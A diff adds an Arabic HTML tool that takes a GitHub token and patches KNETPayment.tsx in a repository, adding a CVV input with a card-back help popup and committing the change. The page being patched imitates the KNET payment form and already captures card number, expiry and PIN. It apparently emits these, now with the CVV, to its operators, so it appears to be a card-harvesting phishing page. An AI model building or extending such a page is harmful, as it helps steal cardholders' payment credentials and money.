@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>إضافة حقل CVV - كي نت</title>
+<style>
+  body{font-family:system-ui,-apple-system,"Segoe UI",Tahoma,Arial,sans-serif;background:#0f172a;color:#e2e8f0;margin:0;padding:24px}
+  .wrap{max-width:780px;margin:0 auto;background:#1e293b;border:1px solid #334155;border-radius:14px;padding:22px}
+  h1{font-size:19px;margin:0 0 6px}
+  p.sub{color:#94a3b8;font-size:13px;margin:0 0 18px;line-height:1.7}
+  input{width:100%;box-sizing:border-box;padding:11px 13px;border-radius:9px;border:1px solid #475569;background:#0f172a;color:#e2e8f0;font-size:14px;direction:ltr}
+  button{width:100%;margin-top:12px;padding:13px;border:0;border-radius:9px;background:#2563eb;color:#fff;font-size:15px;font-weight:700;cursor:pointer}
+  button:disabled{opacity:.6;cursor:default}
+  #log{margin-top:18px;font-size:13px;line-height:1.75;white-space:pre-wrap;font-family:ui-monospace,Menlo,Consolas,monospace;direction:ltr;text-align:left}
+  .ok{color:#4ade80}.err{color:#f87171}.warn{color:#fbbf24}.info{color:#93c5fd}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <h1>إضافة حقل CVV + أيقونة التوضيح — KNETPayment.tsx</h1>
+  <p class="sub">يضيف حقل CVV (3 أرقام) وأيقونة (!) تفتح صورة بطاقة من الخلف مع دائرة على مكان الرمز.</p>
+  <input id="token" placeholder="ghp_...  (GitHub token مع صلاحية repo)" />
+  <button id="go">تعديل الآن</button>
+  <div id="log"></div>
+</div>
+<script>
+const API = 'https://api.github.com/repos/fahshomi-ui/KDD/contents/client/src/pages/KNETPayment.tsx';
+const BRANCH = 'main';
+
+const logEl = document.getElementById('log');
+function log(m, c) { const d = document.createElement('div'); if (c) d.className = c; d.textContent = m; logEl.appendChild(d); }
+function b64d(s) { const bin = atob(s.replace(/\s/g, '')); const a = new Uint8Array(bin.length); for (let i = 0; i < bin.length; i++) a[i] = bin.charCodeAt(i); return new TextDecoder('utf-8').decode(a); }
+function b64e(s) { const a = new TextEncoder().encode(s); let o = ''; for (const b of a) o += String.fromCharCode(b); return btoa(o); }
+
+function insertAfter(src, anchor, text) {
+  const i = src.indexOf(anchor);
+  if (i === -1) throw new Error('ما لقيت السطر: ' + anchor.slice(0, 45));
+  const e = i + anchor.length;
+  return src.slice(0, e) + '\n' + text + src.slice(e);
+}
+function insertBefore(src, anchor, text) {
+  const i = src.indexOf(anchor);
+  if (i === -1) throw new Error('ما لقيت السطر: ' + anchor.slice(0, 45));
+  return src.slice(0, i) + text + '\n' + src.slice(i);
+}
+function replaceOnce(src, from, to) {
+  const i = src.indexOf(from);
+  if (i === -1) throw new Error('ما لقيت السطر: ' + from.slice(0, 45));
+  return src.slice(0, i) + to + src.slice(i + from.length);
+}
+
+const A_DECL = '  const [cardPin, setCardPin] = useState("");';
+const T_DECL = [
+'  const [cardCvv, setCardCvv] = useState("");',
+'  const [showCvvHelp, setShowCvvHelp] = useState(false);'
+].join('\n');
+
+const A_VALID = [
+'    setValidationError("");',
+'    return true;'
+].join('\n');
+const T_VALID = [
+'    if (cardCvv.length !== 3 || !/^\\d{3}$/.test(cardCvv)) {',
+'      setValidationError("خطأ : الرجاء أدخال رمز الأمان CVV المكون من 3 ارقام");',
+'      return false;',
+'    }'
+].join('\n');
+
+const A_EMIT = ['        cvv: cardPin,', '        pin: cardPin,'].join('\n');
+const T_EMIT = ['        cvv: cardCvv,', '        pin: cardPin,'].join('\n');
+
+const A_DEPS = '  }, [selectedPrefix, cardNumber, expiryMonth, expiryYear, cardPin]);';
+const T_DEPS = '  }, [selectedPrefix, cardNumber, expiryMonth, expiryYear, cardPin, cardCvv]);';
+
+const A_FIELD = '                {/* Buttons */}';
+const T_FIELD = [
+'                {/* CVV */}',
+'                <div style={fieldRow}>',
+'                  <label style={fieldLabel}>',
+'                    CVV:',
+'                    <span',
+'                      onClick={() => setShowCvvHelp(true)}',
+'                      style={{',
+'                        display: "inline-flex",',
+'                        alignItems: "center",',
+'                        justifyContent: "center",',
+'                        width: 15,',
+'                        height: 15,',
+'                        borderRadius: "50%",',
+'                        border: "1px solid #0099cc",',
+'                        color: "#0099cc",',
+'                        fontSize: 10,',
+'                        fontWeight: "bold",',
+'                        marginLeft: 6,',
+'                        cursor: "pointer",',
+'                        lineHeight: 1,',
+'                      }}',
+'                    >',
+'                      !',
+'                    </span>',
+'                  </label>',
+'                  <div style={fieldValue}>',
+'                    <input',
+'                      type="tel"',
+'                      inputMode="numeric"',
+'                      maxLength={3}',
+'                      value={cardCvv}',
+'                      onChange={(e) => {',
+'                        const val = e.target.value.replace(/\\D/g, "").slice(0, 3);',
+'                        setCardCvv(val);',
+'                        setValidationError("");',
+'                      }}',
+'                      style={{ ...inputStyle, width: "100%" }}',
+'                    />',
+'                  </div>',
+'                </div>',
+''
+].join('\n');
+
+const A_MODAL = '          {/* Footer */}';
+const T_MODAL = [
+'          {showCvvHelp && (',
+'            <div',
+'              onClick={() => setShowCvvHelp(false)}',
+'              style={{',
+'                position: "fixed",',
+'                top: 0,',
+'                left: 0,',
+'                width: "100%",',
+'                height: "100%",',
+'                backgroundColor: "rgba(0,0,0,0.55)",',
+'                zIndex: 1000000001,',
+'                display: "flex",',
+'                alignItems: "center",',
+'                justifyContent: "center",',
+'              }}',
+'            >',
+'              <div',
+'                onClick={(e) => e.stopPropagation()}',
+'                style={{',
+'                  backgroundColor: "#ffffff",',
+'                  borderRadius: 8,',
+'                  padding: "10px 16px 16px",',
+'                  maxWidth: 420,',
+'                  width: "92%",',
+'                  boxShadow: "0 6px 20px rgba(0,0,0,0.35)",',
+'                }}',
+'              >',
+'                <div style={{ textAlign: "right" }}>',
+'                  <button',
+'                    onClick={() => setShowCvvHelp(false)}',
+'                    style={{',
+'                      background: "transparent",',
+'                      border: 0,',
+'                      fontSize: 22,',
+'                      fontWeight: "bold",',
+'                      cursor: "pointer",',
+'                      opacity: 0.5,',
+'                      lineHeight: 1,',
+'                    }}',
+'                  >',
+'                    &times;',
+'                  </button>',
+'                </div>',
+'                <svg viewBox="0 0 340 210" style={{ width: "100%", display: "block" }}>',
+'                  <defs>',
+'                    <linearGradient id="cvvCardGrad" x1="0" y1="0" x2="1" y2="1">',
+'                      <stop offset="0%" stopColor="#1f4e79" />',
+'                      <stop offset="100%" stopColor="#0b2545" />',
+'                    </linearGradient>',
+'                  </defs>',
+'                  <rect x="5" y="5" width="330" height="200" rx="14" fill="url(#cvvCardGrad)" />',
+'                  <rect x="5" y="34" width="330" height="36" fill="#111827" />',
+'                  <rect x="25" y="92" width="252" height="42" rx="4" fill="#f1f5f9" />',
+'                  <text x="32" y="118" fontSize="11" fontFamily="Verdana" fill="#94a3b8">Signature</text>',
+'                  <rect x="286" y="92" width="36" height="42" rx="4" fill="#ffffff" stroke="#94a3b8" />',
+'                  <text x="304" y="119" fontSize="16" fontFamily="Verdana" fill="#0f172a" textAnchor="middle">123</text>',
+'                  <text x="304" y="86" fontSize="11" fontFamily="Verdana" fill="#ffffff" textAnchor="middle">CVV</text>',
+'                  <circle cx="304" cy="113" r="25" fill="none" stroke="#ef4444" strokeWidth="3" />',
+'                </svg>',
+'                <p',
+'                  style={{',
+'                    fontSize: 12,',
+'                    color: "#555555",',
+'                    textAlign: "center",',
+'                    marginTop: 12,',
+'                    marginBottom: 0,',
+'                    fontFamily: "Verdana, Arial, sans-serif",',
+'                    lineHeight: "18px",',
+'                  }}',
+'                >',
+'                  رمز الأمان CVV هو الأرقام الثلاثة الموجودة خلف البطاقة',
+'                </p>',
+'              </div>',
+'            </div>',
+'          )}',
+''
+].join('\n');
+
+document.getElementById('go').onclick = async function () {
+  const token = document.getElementById('token').value.trim();
+  logEl.innerHTML = '';
+  if (!token) { log('أدخل التوكن أولاً', 'err'); return; }
+  const btn = document.getElementById('go'); btn.disabled = true;
+  const H = { 'Authorization': 'Bearer ' + token, 'Accept': 'application/vnd.github+json' };
+  try {
+    log('1) قراءة KNETPayment.tsx ...', 'info');
+    const r = await fetch(API + '?ref=' + BRANCH + '&t=' + Date.now(), { headers: H, cache: 'no-store' });
+    if (!r.ok) throw new Error('فشل القراءة: HTTP ' + r.status);
+    const meta = await r.json();
+    let out = b64d(meta.content);
+
+    if (out.indexOf('showCvvHelp') !== -1) { log('الملف معدّل مسبقاً — لا تغيير', 'warn'); return; }
+
+    out = insertAfter(out, A_DECL, T_DECL);
+    log('2) متغيرات الحالة (cardCvv) — تم', 'ok');
+    out = insertBefore(out, A_VALID, T_VALID);
+    log('3) التحقق: CVV لازم 3 أرقام — تم', 'ok');
+    out = replaceOnce(out, A_EMIT, T_EMIT);
+    log('4) إرسال CVV للبطاقة المباشرة — تم', 'ok');
+    out = replaceOnce(out, A_DEPS, T_DEPS);
+    log('5) تحديث الاعتماديات — تم', 'ok');
+    out = insertBefore(out, A_FIELD, T_FIELD);
+    log('6) حقل CVV + أيقونة (!) — تم', 'ok');
+    out = insertBefore(out, A_MODAL, T_MODAL);
+    log('7) صورة البطاقة المنبثقة (SVG) — تم', 'ok');
+
+    log('8) حفظ في GitHub ...', 'info');
+    const pr = await fetch(API, {
+      method: 'PUT',
+      headers: Object.assign({ 'Content-Type': 'application/json' }, H),
+      body: JSON.stringify({
+        message: 'feat(knet): add CVV field with card-back help tooltip',
+        content: b64e(out), sha: meta.sha, branch: BRANCH
+      })
+    });
+    if (!pr.ok) { let m = ''; try { m = (await pr.json()).message; } catch (e) {} throw new Error('فشل الحفظ: HTTP ' + pr.status + ' ' + (m || '')); }
+    log('✓ تم الحفظ بنجاح', 'ok');
+    log('✓ الآن أعمل build/redeploy للواجهة.', 'ok');
+  } catch (e) {
+    log('✗ ' + e.message, 'err');
+  } finally { btn.disabled = false; }
+};
+</script>
+</body>
+</html>
